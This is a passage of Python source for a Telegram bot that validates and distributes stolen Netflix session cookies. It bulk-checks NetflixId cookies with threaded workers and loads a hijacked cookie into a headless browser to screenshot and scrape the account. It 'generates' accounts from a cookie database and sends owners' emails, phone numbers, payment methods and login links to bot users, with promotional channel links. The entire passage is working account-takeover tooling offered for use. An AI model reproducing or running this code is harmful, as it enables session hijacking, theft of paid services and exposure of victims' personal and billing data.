            link1 = res.get("link")
            link2 = res.get("link2")
            link3 = res.get("link3")
            link_exp = res.get("link_expiry", "~1hr")
            flag_map = {"US":"🇺🇸","GB":"🇬🇧","IN":"🇮🇳","CA":"🇨🇦","AU":"🇦🇺","BR":"🇧🇷",
                        "MX":"🇲🇽","TR":"🇹🇷","PK":"🇵🇰","ID":"🇮🇩","PH":"🇵🇭"}
            flag = flag_map.get(str(country).upper(), "🌍")

            result_msg = (
                f"✅ *VALID COOKIE* 💎\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📧 *Email:* `{data.get('email','N/A')}`\n"
                f"👑 *Plan:* `{data.get('plan','Unknown')}`\n"
                f"🌍 *Country:* `{country}` {flag}\n"
                f"🖥 *Quality:* `{data.get('quality','Unknown')}`\n"
                f"💰 *Price:* `{data.get('price','Unknown')}`\n"
                f"💳 *Payment:* `{data.get('payment','Unknown')}`\n"
                f"📅 *Next Bill:* `{data.get('expiry','N/A')}`\n"
                f"🗓 *Member Since:* `{data.get('member_since','N/A')}`\n"
                f"☎️ *Phone:* `{data.get('phone','N/A')}`\n"
                f"🕐 *Checked:* {ts}"
            )
            mk = types.InlineKeyboardMarkup()
            if link1: mk.row(types.InlineKeyboardButton(f"💻 PC (~{link_exp})", url=link1))
            if link2: mk.row(types.InlineKeyboardButton("📱 Mobile", url=link2))
            if link3: mk.row(types.InlineKeyboardButton("📺 TV", url=link3))
            try:
                bot.edit_message_text(result_msg, uid, st.message_id,
                    parse_mode='Markdown', reply_markup=mk if (link1 or link2 or link3) else None)
            except Exception: pass
            # Also send txt file
            txt_content = (
                f"== NETFLIX VALID (Premium Check) ==\n"
                f"Email      : {data.get('email','N/A')}\n"
                f"Plan       : {data.get('plan','Unknown')}\n"
                f"Country    : {country}\n"
                f"Quality    : {data.get('quality','Unknown')}\n"
                f"Price      : {data.get('price','Unknown')}\n"
                f"Payment    : {data.get('payment','Unknown')}\n"
                f"Next Bill  : {data.get('expiry','N/A')}\n"
                f"Member     : {data.get('member_since','N/A')}\n"
                f"Phone      : {data.get('phone','N/A')}\n"
                f"PC Link    : {link1 or 'N/A'}\n"
                f"Mobile Link: {link2 or 'N/A'}\n"
                f"TV Link    : {link3 or 'N/A'}\n"
                f"Cookie     : NetflixId={nid}\n"
                f"Checked    : {ts}\n"
                f"{'='*40}\n"
            )
            try:
                with io.BytesIO(txt_content.encode('utf-8')) as f_obj:
                    f_obj.name = f"Netflix_Premium_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    bot.send_document(uid, f_obj, caption="📄 Cookie details + links")
            except Exception:
                pass

    @bot.message_handler(func=lambda m: m.text == "🎁 Generate Netflix")
    def generate_netflix(message):
        save_user(message.chat.id)
        if not _gate_check(message.chat.id): return

        # Use send_message (not reply_to) so this works when called from gen_retry
        # after the original button message has already been deleted.
        status_msg = bot.send_message(message.chat.id, "⏳ **Fetching Account from Database...**", parse_mode='Markdown')
        if not supabase:
            return bot.edit_message_text("❌ **Database not configured.**\nContact the admin.", message.chat.id, status_msg.message_id, parse_mode='Markdown')

        chat_id = message.chat.id
        smsg_id = status_msg.message_id

        def _do_generate(cid=chat_id, sid=smsg_id):
            try:
                res = supabase.table('netflix').select("*").limit(100).execute()
            except Exception as e:
                bot.edit_message_text(f"❌ **Database Error.**\n`{e}`", cid, sid, parse_mode='Markdown')
                return

            if not res.data:
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("🔄 Try Again", callback_data="gen_retry"))
                bot.edit_message_text(
                    "❌ **Database is Empty!**\n\nNo Netflix accounts are available right now.\nPlease check back later.",
                    cid, sid, reply_markup=markup, parse_mode='Markdown'
                )
                return

            valid_acc = None
            valid_cookie = None
            valid_row_id = None
            valid_nid = None
            # Fast-validate cookies without Playwright (1-2s each instead of 10-15s).
            # Once a valid cookie is found, take a screenshot separately.
            rows = list(res.data or [])
            random.shuffle(rows)
            for row in rows:
                c = _db_row_cookie(row)
                if not c:
                    continue
                chk = check_cookie_fast(c)
                if chk.get('valid'):
                    valid_acc = chk
                    valid_cookie = c
                    valid_row_id = row.get('id')
                    valid_nid = parse_smart_cookie(c)
                    if valid_row_id:
                        try: supabase.table('netflix').delete().eq('id', valid_row_id).execute()
                        except: pass
                    break

            if valid_acc:
                # Take screenshot for the valid cookie (best-effort, reduced timeouts)
                if valid_nid and _PLAYWRIGHT_OK and SCREENSHOT_SEMAPHORE.acquire(timeout=8):
                    try:
                        with _sync_playwright() as p:
                            browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
                            ctx = browser.new_context(viewport={'width': 1280, 'height': 720}, java_script_enabled=True)
                            ctx.add_cookies([{'name': 'NetflixId', 'value': valid_nid, 'domain': '.netflix.com', 'path': '/'}])
                            pg = ctx.new_page()
                            pg.goto("https://www.netflix.com/browse", timeout=6000, wait_until="domcontentloaded")
                            try: pg.wait_for_timeout(800)
                            except Exception: pass
                            try:
                                content = pg.content()
                                pw_profiles = re.findall(r'class="profile-name">([^<]+)<', content)
                                if pw_profiles and isinstance(valid_acc.get('data'), dict):
                                    profiles = list(set([clean_text(pr) for pr in pw_profiles]))
                                    profiles = [pr for pr in profiles if pr not in ["Add Profile", "Add", "New Profile", "add-profile"]]
                                    if profiles:
                                        valid_acc['data']['profiles'] = profiles
                            except Exception: pass
                            valid_acc['screenshot'] = pg.screenshot(type='jpeg', quality=60)
                            browser.close()
                    except Exception as se:
                        print(f"[Gen] Screenshot error: {se}")
                    finally:
                        SCREENSHOT_SEMAPHORE.release()

            if valid_acc:
                try: bot.delete_message(cid, sid)
                except: pass
                send_hit(cid, valid_acc, valid_cookie, "Gen", include_screenshot=True)
                # "Change Account" button lets users swap to another DB account
                swap_markup = types.InlineKeyboardMarkup()
                swap_markup.add(types.InlineKeyboardButton("🔄 Change Account", callback_data="gen_retry"))
                summary = build_hits_txt([(valid_acc, valid_cookie)], title="NETFLIX GENERATED ACCOUNT")
                with io.BytesIO(summary.encode('utf-8')) as f:
                    f.name = f"Netflix_Account_{datetime.now().strftime('%Y%m%d')}.txt"
                    bot.send_document(cid, f, caption="📂 **Generated Account Details**\n\n👇 Not satisfied? Tap below to get another account.", reply_markup=swap_markup)
            else:
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("🔄 Try Again", callback_data="gen_retry"))
                bot.edit_message_text(
                    "❌ **Stock Out!**\n\nAll accounts in the database are currently invalid or expired.\nAdmin needs to add fresh cookies.\nPlease try again later.",
                    cid, sid, reply_markup=markup, parse_mode='Markdown'
                )

        GLOBAL_EXECUTOR.submit(_do_generate)

    # ── Auto-reaction constants (emoji reactions available in Telegram) ──────
    _REACTIONS = [
        "❤", "🔥", "👏", "🥰", "👍", "🎉", "🤩", "💯",
        "😍", "🤯", "🤔", "👌", "💪", "⚡", "🌟", "😎",
    ]

    @bot.message_handler(content_types=['document', 'text'])
    def handle_input(message):
        uid = message.chat.id
        save_user(uid) # Save user automatically when they send any message

        # ── In groups: only handle cookie-check modes (admin-only) ────────────
        if message.chat.type in ('group', 'supergroup'):
            # In groups, regular users don't use cookie features via this handler.
            # Only admin in an active add-cookie session should be routed here.
            if is_admin(uid) and _ac_sessions.get(uid, {}).get("active"):
                handle_add_cookie_input(message)
            return

        # ── In DM: regular users get auto-reaction only, no text response ─────
        if message.chat.type == 'private' and not is_admin(uid):
            # Auto-react with a random emoji
            try:
                bot.set_message_reaction(
                    message.chat.id, message.message_id,
                    [types.ReactionTypeEmoji(random.choice(_REACTIONS))]
                )
            except Exception:
                pass
            return

        if not _gate_check(uid): return

        # ── Admin add-cookie persistent mode ──────────────────────────────────
        if is_admin(uid) and _ac_sessions.get(uid, {}).get("active"):
            if message.content_type in ('document', 'text'):
                handle_add_cookie_input(message)
            return

        # Admin-only buttons that are not handled elsewhere — silently ignore
        if is_admin(uid) and message.content_type == 'document' and not user_modes.get(uid):
            return  # admin sent a doc outside of any mode — ignore silently

        mode = user_modes.get(uid)

        # Ignore buttons/commands
        if message.text and (message.text.startswith("/") or message.text in ["📩 Send Here (DM)", "📡 Send to Channel", "🛑 Stop System", "📺 TV Login", "🎁 Generate Netflix", "🔍 Free Check", "💎 Premium Check", "📣 Broadcast", "👥 Users Stats", "➕ Add Cookie", "👑 Manage Access", "🗑 Manage DB"]): return

        if not mode: return bot.reply_to(message, "❌ **Select a mode first!**", parse_mode='Markdown')
        if mode.get('stop'):
            return bot.reply_to(message, "🛑 **System is stopped.**\nClick a Mode button to resume.")

        raw_text = ""
        is_file_input = False
        try:
            if message.content_type == 'document':
                is_file_input = True
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                raw_text = _extract_raw_text_from_download(
                    downloaded_file, message.document.file_name or ""
                )
            else:
                raw_text = message.text or ""
            
            # Extract all cookies using smart multi-format extractor
            valid_cookies = extract_cookies_from_block(raw_text)
            
            if not valid_cookies: return bot.reply_to(message, "❌ **No Valid Cookies Found!**\n\nSupported formats:\n• JSON array (Cookie-Editor export)\n• Semicolon-separated (`NetflixId=v3...;...`)\n• Netscape TSV format\n• Raw `NetflixId=v3...`", parse_mode='Markdown')

            # ── Cookie limit enforcement ──────────────────────────────
            # Non-admin users: ONLY 1 cookie per check, no bulk
            # Admin: unlimited bulk allowed
            if not is_admin(uid):
                # Only 1 cookie allowed per check for non-admin
                if len(valid_cookies) > 1:
                    bot.reply_to(message,
                        "⚠️ *Single Cookie Only!*\n\n"
                        "You can only check *1 cookie* at a time.\n"
                        "Send text, .txt or .zip with only 1 cookie.\n\n"
                        "_Bulk checking is admin-only._",
                        parse_mode='Markdown')
                    return
                # Daily limit check
                used = get_daily_usage(uid)
                if used >= USER_DAILY_LIMIT:
                    bot.reply_to(message,
                        f"⏰ *Daily Limit Reached!*\n\n"
                        f"You've used your *{USER_DAILY_LIMIT}* free checks today.\n"
                        f"Limit resets at midnight.",
                        parse_mode='Markdown')
                    return
            # ──────────────────────────────────────────────────────────

            should_send_file = is_file_input or len(valid_cookies) > 1
            is_bulk = should_send_file and is_admin(uid)  # bulk only for admin
            
            cookies_to_process = valid_cookies
            limit_msg = None
            has_access = is_admin(uid)

            # Bulk Access & Daily Limit Logic (Admin only gets here for bulk)
            if is_bulk and is_admin(uid):
                has_access = True

            # Single Cookie Animation Logic
            if not is_bulk:
                status_msg = bot.reply_to(message, "⏳ **Initializing...**", parse_mode='Markdown')
                
                # Animation Thread
                def animate_check():
                    animations = [
                        "🌑 🌒 🌓 🌔 🌕 🌖 🌗 🌘",
                        "⣾ ⣽ ⣻ ⢿ ⡿ ⣟ ⣯ ⣷",
                        "⚡ 🔌 💡 🔋 🔌 ⚡",
                        "💾 💿 📀 📼 📷 📺"
                    ]
                    messages = [
                        "🚀 **Connecting to Netflix...**",
                        "🔑 **Decrypting Session Token...**",
                        "🌍 **Bypassing Geo-Block...**",
                        "🔍 **Scanning Account Data...**",
                        "💎 **Checking Subscription...**",
                        "💳 **Verifying Payment Info...**"
                    ]
                    i = 0
                    while getattr(status_msg, "keep_animating", True):
                        if user_modes.get(message.chat.id, {}).get('stop'):
                            break
                        try:
                            msg_idx = (i // 2) % len(messages)
                            anim_set_idx = (i // 6) % len(animations)
                            anim_frames = animations[anim_set_idx].split()
                            frame = anim_frames[i % len(anim_frames)]
                            percent = min((i * 8) % 100, 99)
                            bar = "█" * (percent // 10) + "░" * (10 - (percent // 10))
                            
                            bot.edit_message_text(f"{frame} {messages[msg_idx]}\n`[{bar}] {percent}%`", message.chat.id, status_msg.message_id, parse_mode='Markdown')
                            i += 1
                            time.sleep(0.8)
                        except: break
                
                status_msg.keep_animating = True
                threading.Thread(target=animate_check, daemon=True).start()
                
                start_t = time.time()
                # Full check with screenshot — result + screenshot sent together in one message
                res = check_cookie(valid_cookies[0], get_screenshot=True)
                status_msg.keep_animating = False
                
                try: bot.delete_message(message.chat.id, status_msg.message_id)
                except: pass
                
                if res["valid"]:
                    send_hit(mode['target'], res, valid_cookies[0], round(time.time() - start_t, 2), include_screenshot=True, add_back_button=True)
                else:
                    bot.reply_to(message, f"❌ **Invalid Cookie**\nReason: {res.get('msg', 'Unknown')}")
                return

            def background_checker(cookies, chat_id, target, send_file, limit_warning, is_privileged):
                BULK_THREADS = len(NFTOKEN_KEY_POOL)

                def _bulk_controls():
                    m = types.InlineKeyboardMarkup()
                    m.row(
                        types.InlineKeyboardButton("🛑 Stop", callback_data="bulk_stop"),
                        types.InlineKeyboardButton("🔙 Back", callback_data="bulk_back")
                    )
                    return m

                def _progress_bar(done, total):
                    pct = int((done / total) * 100) if total else 0
                    filled = pct // 5
                    bar = "█" * filled + "░" * (20 - filled)
                    return f"`[{bar}]` **{pct}%**"

                total = len(cookies)
                status_msg = bot.send_message(chat_id,
                    f"⚡ **Bulk Check Started!** ({BULK_THREADS} threads)\n\n"
                    f"{_progress_bar(0, total)}\n"
                    f"`[0/{total}]` Checked\n✅ Valid: 0 | ❌ Dead: 0",
                    reply_markup=_bulk_controls(), parse_mode='Markdown')

                valid_count = 0
                dead_count = 0
                done_count = 0
                count_lock = threading.Lock()
                hits_list = []
                partial_hits[chat_id] = hits_list
                last_update = time.time()

                def _check_one(cookie):
                    nonlocal valid_count, dead_count, done_count, last_update
                    if user_modes.get(chat_id, {}).get('stop'):
                        return
                    try:
                        start_t = time.time()
                        api_key = _pick_api_key()
                        res = check_cookie_fast(cookie, api_key=api_key)
                        taken = round(time.time() - start_t, 2)
                        with count_lock:
                            done_count += 1
                            if res and res.get("valid"):
                                valid_count += 1
                                hits_list.append((res, cookie))
                                send_hit(target, res, cookie, taken, include_screenshot=False)
                            else:
                                dead_count += 1
                            cur_done = done_count
                            cur_valid = valid_count
                            cur_dead = dead_count
                        # Update progress every ~1.5s
                        if time.time() - last_update > 1.5 or cur_done == total:
                            try:
                                bot.edit_message_text(
                                    f"⚡ **Bulk Check Progress...** ({BULK_THREADS} threads)\n\n"
                                    f"{_progress_bar(cur_done, total)}\n"
                                    f"`[{cur_done}/{total}]` Checked\n✅ Valid: {cur_valid} | ❌ Dead: {cur_dead}",
                                    chat_id, status_msg.message_id,
                                    reply_markup=_bulk_controls(), parse_mode='Markdown')
                                last_update = time.time()
                            except: pass
                    except:
                        with count_lock:
                            dead_count += 1
                            done_count += 1

                with concurrent.futures.ThreadPoolExecutor(max_workers=BULK_THREADS) as pool:
                    futures = [pool.submit(_check_one, c) for c in cookies if not user_modes.get(chat_id, {}).get('stop')]
                    concurrent.futures.wait(futures)

                # Final progress update
                try:
                    bot.edit_message_text(
                        f"⚡ **Bulk Check Complete!**\n\n"
                        f"{_progress_bar(total, total)}\n"
                        f"`[{total}/{total}]` Checked\n✅ Valid: {valid_count} | ❌ Dead: {dead_count}",
                        chat_id, status_msg.message_id,
                        reply_markup=_bulk_controls(), parse_mode='Markdown')
                except: pass

                # Clear the live partial hits reference once done (stop_sys won't double-send)
                partial_hits.pop(chat_id, None)

                if not is_privileged and not is_admin(uid):
                    increment_daily_usage(uid, len(cookies))
                
                channel_url = f"https://t.me/{CHANNELS[1].replace('@', '')}" if CHANNELS else None
                if hits_list and send_file:
                    bulk_results[chat_id] = hits_list
                    markup = types.InlineKeyboardMarkup()
                    markup.add(
                        types.InlineKeyboardButton("📄 Cookie Only", callback_data="out_cookie"),
                        types.InlineKeyboardButton("🔗 Cookie + Link", callback_data="out_both")
                    )
                    if channel_url:
                        markup.add(types.InlineKeyboardButton("📢 View Channel", url=channel_url))
                    markup.add(types.InlineKeyboardButton("🔙 Back to Menu", callback_data="bulk_back"))
                    try: bot.send_message(chat_id, f"✅ **Check Complete**\n✅ Valid: {valid_count}\n❌ Dead: {dead_count}\n\n👇 **Choose Output Format:**", reply_markup=markup, parse_mode="Markdown")
                    except: pass
                else:
                    markup = types.InlineKeyboardMarkup()
                    if channel_url:
                        markup.add(types.InlineKeyboardButton("📢 View Channel", url=channel_url))
                    markup.add(types.InlineKeyboardButton("🔙 Back to Menu", callback_data="bulk_back"))
                    try: bot.send_message(chat_id, f"✅ **Check Complete**\nNo valid accounts found.", reply_markup=markup)
                    except: pass

                if limit_warning:
                    lm = types.InlineKeyboardMarkup()
                    lm.row(
                        types.InlineKeyboardButton("🔓 Request Access", callback_data=f"req_bulk_{chat_id}"),
                        types.InlineKeyboardButton("🔙 Back", callback_data="bulk_back")
                    )
                    try: bot.send_message(chat_id, limit_warning, reply_markup=lm, parse_mode='Markdown')
                    except: pass

            # Start background task using executor to limit concurrency under heavy load
            GLOBAL_EXECUTOR.submit(background_checker, cookies_to_process, uid, mode['target'], should_send_file, limit_msg, has_access)

        except Exception as e:
            bot.reply_to(message, f"❌ Error: {e}")

    def send_hit(chat_id, res, cookie, duration="N/A", include_screenshot=True, add_back_button=False):
        data = res.get("data", {})
        
        # Clean up previous single-check result for this user
        if add_back_button:
            old_msg_id = user_last_bot_msg.get(chat_id)
            if old_msg_id:
                try: bot.delete_message(chat_id, old_msg_id)
                except: pass
                user_last_bot_msg.pop(chat_id, None)
        
        country_code = res.get('country', 'Unknown')
        flag = get_flag(country_code)
        currency_sym = get_currency_symbol(country_code)
        
        price = data.get('price', 'Unknown')
        if price != 'Unknown' and currency_sym not in price:
            price = f"{currency_sym} {price}"

        # HTML Escaping Helper
        def esc(t):
            if t is None: return "N/A"
            return str(t).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

        # Use Mobile link (x_l2) as the in-message "Tap To Access" hyperlink
        login_url = res.get('link2') or res.get('link') or ''
        if not login_url or "http" not in login_url:
            login_url = "https://www.netflix.com/browse"

        # Profiles
        profiles = data.get('profiles', [])
        if profiles:
            profiles_str = ", ".join(profiles)
        else:
            profiles_str = "None"

        # Random Themes for Premium Look
        themes = [
            {
                "header": "<b>💎 ⚜️ NETFLIX LUXURY ⚜️ 💎</b>",
                "status": "🟢 Status", "region": "🌍 Region", "since": "📅 Since",
                "acc": "<b>👤 Account Info</b>", "name": "📛 Name", "email": "📧 Email", "phone": "📱 Phone", "pay": "💳 Pay", "auto": "🔄 Auto", "price": "💲 Price",
                "sub": "<b>📺 Subscription</b>", "plan": "👑 Plan", "qual": "🖥 Quality", "ads": "🚫 Ads", "extra": "👥 Extra",
                "bill_h": "<b>🗓 Next Bill</b>", "bill": "📅 Date",
                "prof": "<b>🎭 Profiles</b>",
                "link_h": "<b>🔗 Magic Access</b>", "link_txt": "Click To Login", "valid": "⏳ Valid: 1 Minute",
                "time": "⚡ Speed", "line": "━━━━━━━━━━━━━━━━━━━━━━"
            },
            {
                "header": "<b>💠 ⚡ CYBER NETFLIX ⚡ 💠</b>",
                "status": "❇️ Status", "region": "🌐 Region", "since": "📆 Joined",
                "acc": "<b>🤖 User Data</b>", "name": "👤 Name", "email": "✉️ Mail", "phone": "📞 Mobile", "pay": "💳 Method", "auto": "♻️ Renew", "price": "💸 Cost",
                "sub": "<b>⚡ Plan Info</b>", "plan": "💎 Tier", "qual": "📺 Res", "ads": "⛔ No Ads", "extra": "🫂 Slots",
                "bill_h": "<b>🗓 Renewal</b>", "bill": "📅 Date",
                "prof": "<b>👥 Who's Watching</b>",
                "link_h": "<b>⛓️ Instant Link</b>", "link_txt": "Tap To Access", "valid": "⏱️ Expires in 60s",
                "time": "🚀 Latency", "line": "══════════════════════"
            },
            {
                "header": "<b>☠︎︎ 𖤐 NETFLIX DARK 𖤐 ☠︎︎</b>",
                "status": "💀 Status", "region": "🗺 Region", "since": "🕰 Since",
                "acc": "<b>🕷 Owner Info</b>", "name": "🩸 Name", "email": "📨 Email", "phone": "📞 Phone", "pay": "🕸 Pay", "auto": "🔄 Auto", "price": "💸 Price",
                "sub": "<b>⚝ Subscription</b>", "plan": "𖤐 Plan", "qual": "📺 Qual", "ads": "🚫 Ads", "extra": "👥 Extra",
                "bill_h": "<b>📅 Billing</b>", "bill": "🗓 Date",
                "prof": "<b>🎭 Users</b>",
                "link_h": "<b>🔗 Login</b>", "link_txt": "Enter Account", "valid": "⏳ 1 Min Validity",
                "time": "⚡ Time", "line": "━━━━━━━━━━━━━━━━━━━━━━"
            },
            {
                "header": "<b>♛ ♚ NETFLIX ROYAL ♚ ♛</b>",
                "status": "✅ Status", "region": "🏳 Region", "since": "📅 Since",
                "acc": "<b>👤 Details</b>", "name": "👑 Name", "email": "📧 Email", "phone": "☎️ Phone", "pay": "💳 Pay", "auto": "🔄 Auto", "price": "💰 Price",
                "sub": "<b>📺 Plan</b>", "plan": "👑 Type", "qual": "🖥 Qual", "ads": "🚫 Ads", "extra": "👥 Extra",
                "bill_h": "<b>🗓 Next Bill</b>", "bill": "📅 Date",
                "prof": "<b>🎭 Profiles</b>",
                "link_h": "<b>🔗 Access</b>", "link_txt": "Login Now", "valid": "⏳ Valid: 1 Min",
                "time": "⏱ Time", "line": "━━━━━━━━━━━━━━━━━━━━━━"
            }
        ]
        
        th = random.choice(themes)

        msg = (
            f"{th['header']}\n\n"
            f"<b>{th['status']}:</b> Active\n"
            f"<b>{th['region']}:</b> {esc(country_code)} {flag}\n"
            f"<b>{th['since']}:</b> {esc(data.get('member_since', 'N/A'))} {esc(data.get('member_duration', ''))}\n\n"
            
            f"{th['acc']}\n"
            f"<b>├ {th['name']}:</b> {esc(data.get('name', 'Unknown'))}\n"
            f"<b>├ {th['email']}:</b> <code>{esc(data.get('email', 'N/A'))}</code> {'✅' if data.get('email_verified') == 'Yes ✅' else ''}\n"
            f"<b>├ {th['phone']}:</b> <code>{esc(data.get('phone', 'N/A'))}</code> {'✅' if data.get('phone_verified') == 'Yes ✅' else ''}\n"
            f"<b>├ {th['pay']}:</b> {esc(data.get('payment', 'Unknown'))}\n"
            f"<b>├ {th['auto']}:</b> {esc(data.get('auto_payment', 'No ❌'))}\n"
            f"<b>└ {th['price']}:</b> {esc(price)}\n\n"
            
            f"{th['sub']}\n"
            f"<b>├ {th['plan']}:</b> {esc(data.get('plan', 'Unknown'))} (📺 {esc(data.get('max_streams', 'Unknown'))} Screens)\n"
            f"<b>├ {th['qual']}:</b> {esc(data.get('quality', 'Unknown'))}\n"
            f"<b>├ {th['ads']}:</b> {esc(data.get('has_ads', 'No ❌'))}\n"
            f"<b>└ {th['extra']}:</b> {esc(data.get('extra_members', 'No ❌'))}\n\n"
            
            f"{th['bill_h']}\n"
            f"<b>└ {th['bill']}:</b> {esc(data.get('expiry', 'N/A'))}\n\n"

            f"{th['prof']} ({len(profiles)})\n"
            f"<b>└</b> {esc(profiles_str)}\n\n"
            
            f"{th['link_h']}\n"
            f"<b>├</b> <a href='{login_url}'>{th['link_txt']}</a>\n"
            f"<b>└</b> <i>{th['valid']}</i>\n\n"
            
            f"<b>{th['time']}:</b> {duration}s\n"
            f"{th['line']}\n"
            f"<b>👨‍💻 Admin:</b> <a href='https://t.me/F88UF'>Message Me</a>\n"
            f"<b>📢 Channel:</b> <a href='https://t.me/F88UF9844'>Join Channel</a>\n\n"
            f"<b>🍪 COOKIE COPY:</b>\n<code>{cookie}</code>"
        )

        # Build inline login buttons (PC / Mobile / TV)
        login_markup = types.InlineKeyboardMarkup()
        link_buttons = []
        if res.get('link') and str(res.get('link', '')).startswith('http'):
            exp_lbl = f" (~{res['link_expiry']})" if res.get('link_expiry') else ""
            link_buttons.append(types.InlineKeyboardButton(f"💻 PC{exp_lbl}", url=res['link']))
        if res.get('link2') and str(res.get('link2', '')).startswith('http'):
            link_buttons.append(types.InlineKeyboardButton("📱 Mobile", url=res['link2']))
        if res.get('link3') and str(res.get('link3', '')).startswith('http'):
            link_buttons.append(types.InlineKeyboardButton("📺 TV", url=res['link3']))
        if link_buttons:
            login_markup.row(*link_buttons)
        if add_back_button:
            login_markup.add(types.InlineKeyboardButton("🔙 Back to Menu", callback_data="tv_back"))

        if include_screenshot and res.get('screenshot'):
            try:
                img = io.BytesIO(res['screenshot'])
                img.name = 'screenshot.jpg' 
                sent = bot.send_photo(chat_id, img, caption=msg, parse_mode="HTML", reply_markup=login_markup)
            except:
                sent = bot.send_message(chat_id, msg, parse_mode="HTML", disable_web_page_preview=True, reply_markup=login_markup)
        else: 
            sent = bot.send_message(chat_id, msg, parse_mode="HTML", disable_web_page_preview=True, reply_markup=login_markup)
        # Track last single-check result message for cleanup on next check
        if add_back_button:
            user_last_bot_msg[chat_id] = sent.message_id
        return sent

    # Fix for Conflict error: skip pending updates
    while True:
        try:
            bot.infinity_polling(timeout=90, long_polling_timeout=60, skip_pending=True)
        except Exception as e:
            print(f"⚠️ Polling Error: {e}")
            # If conflict (409), wait longer to allow other instance to close
            if "409" in str(e):
                time.sleep(30)
            else:
                time.sleep(5)

if __name__ == "__main__":
    main()
